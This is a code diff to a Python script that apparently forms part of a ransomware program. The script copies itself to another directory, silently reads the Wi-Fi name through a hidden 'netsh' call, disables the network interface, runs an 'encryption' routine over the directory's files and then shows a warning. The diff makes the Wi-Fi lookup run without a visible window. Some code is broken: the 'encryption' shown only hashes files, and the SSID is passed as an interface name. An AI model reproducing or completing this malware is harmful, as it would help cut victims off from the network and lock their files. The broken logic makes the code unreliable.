@@ -2,6 +2,7 @@ import shutil
 import os
 import hashlib
 import ctypes
+import subprocess, re
 
 
 main_file_directory = os.getcwd()
@@ -24,18 +25,9 @@ def encryption(file_list):
         with open(filename, 'rb', buffering=0) as f:
             for n in iter(lambda : f.readinto(mv), 0):
                 h.update(mv[:n])
-
 def wifi_scraper():
-    wifi_ssid = None
-    os.system("netsh wlan show interface" + ' > output.txt')
-    if os.path.exists('output.txt'):
-        fp = open('output.txt', "r")
-        output = fp.read()
-        ssid_line = fp.readline()[9]
-        fp.close()
-    os.remove("output.txt")
-    
-
+    ssid = re.search('(?<=: ).*', re.search(r'(?<=\n) *SSID.*(?=\r\n)', subprocess.check_output('netsh wlan show interfaces', creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8')).group()).group()
+    return ssid
 
 if main_file_directory is not destination_directory:
     shutil.copy(main_file_directory,destination_directory)
@@ -46,7 +38,7 @@ elif main_file_directory is destination_directory:
     sub_directory_list = os.listdir()
     wifi = wifi_scraper()
     try:
-        os.system("netsh interface set interface name = " + wifi + " admin=DISABLED")#disable wifi
+        os.system("netsh interface set interface name = " + wifi + " admin=DISABLED")
         encryption(sub_directory_list)
         warning()
     except:
